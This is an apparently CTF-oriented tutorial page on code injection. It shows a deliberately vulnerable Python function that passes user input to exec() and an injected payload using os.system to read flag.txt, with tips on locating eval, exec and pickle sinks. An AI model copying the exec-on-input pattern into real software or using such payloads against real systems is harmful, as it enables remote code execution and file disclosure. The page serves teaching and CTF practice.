---
title: "Code Injection"
description: "Exploit unsafe dynamic code execution in web applications to achieve code execution or sensitive data access."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["code injection", "python", "eval", "exec", "rce", "ctf"]
authors: ["CTF.Support Team"]
summary: "Learn how improper input sanitization allows attackers to inject and execute code on the server side."
aliases: ["/web/code-injection/"]
slug: "code-injection"
toc: true
---

## Introduction

Code Injection vulnerabilities occur when user-controllable input is executed directly by the interpreter.
In CTFs, this often leads to remote code execution (RCE) or the disclosure of internal files.

## Example: Python `exec()`

```python
def process_input(data):
    exec(data)
    return

data = input('Enter some data: ')
process_input(data)
```

### Exploit

```python
import os; os.system('cat flag.txt')
```

## Tips

- Search for functions like `eval`, `exec`, `pickle.loads`, or template evaluation.
- Inject harmless test payloads first (e.g., `print(1+1)` or `sleep(2)`).
- Always URL‑encode test injections when passing input via parameters.
